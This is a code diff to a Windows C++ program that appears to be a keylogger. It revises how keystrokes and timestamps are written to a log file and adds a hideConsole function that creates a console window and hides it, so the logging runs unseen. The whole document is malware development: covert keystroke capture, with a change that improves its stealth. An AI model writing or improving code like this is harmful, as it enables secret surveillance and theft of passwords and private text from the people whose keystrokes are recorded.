@@ -16,17 +16,19 @@ using namespace std;
 
 //Function prototypes
 void LOG(int key, char* file);
-char* timeStamp();
+void timeStamp();
+void hideConsole(); 
+
 
 //Entry point 
 int main()
 {
 
 	//Hide the console 
-	FreeConsole();
+	hideConsole(); 
 
 	//Log a time stamp 
-	LOG(0x30A7, FILE_NAME);
+	timeStamp();
 
 	while (1) {
 
@@ -87,16 +89,6 @@ void LOG(int key, char* file) {
 			fprintf(log, "%s", "[CAPS]"); 
 			break; 
 
-		case 0x30A7:
-			fprintf(log, "%s", "\n");
-			fprintf(log, "%s", "\n------------");
-			fprintf(log, "%s", "\n");
-			fprintf(log, "%s", timeStamp());
-			fprintf(log, "%s", "------------");
-			fprintf(log, "%s", "\n");
-			fprintf(log, "%s", "\n");
-			break;
-
 	default:
 
 		//Check the low order bits
@@ -121,8 +113,18 @@ void LOG(int key, char* file) {
 	fclose(log);
 }
 
+//Hide the console window 
+void hideConsole() {
+
+	HWND hide; 
+	AllocConsole();
+	hide = GetConsoleWindow(); 
+
+	ShowWindow(hide, 0); 
+}
+
 //Create a time stamp 
-char* timeStamp() {
+void timeStamp() {
 
 	//Get the current time 
 	time_t current = time(0);
@@ -130,5 +132,15 @@ char* timeStamp() {
 	//Convert to a string 
 	char* d_time = ctime(&current);
 
-	return d_time;
+	FILE* log = fopen(FILE_NAME, "a+");
+
+	fprintf(log, "%s", "\n");
+	fprintf(log, "%s", "\n------------");
+	fprintf(log, "%s", "\n");
+	fprintf(log, "%s", d_time);
+	fprintf(log, "%s", "------------");
+	fprintf(log, "%s", "\n");
+	fprintf(log, "%s", "\n");
+
+	fclose(log);
 }
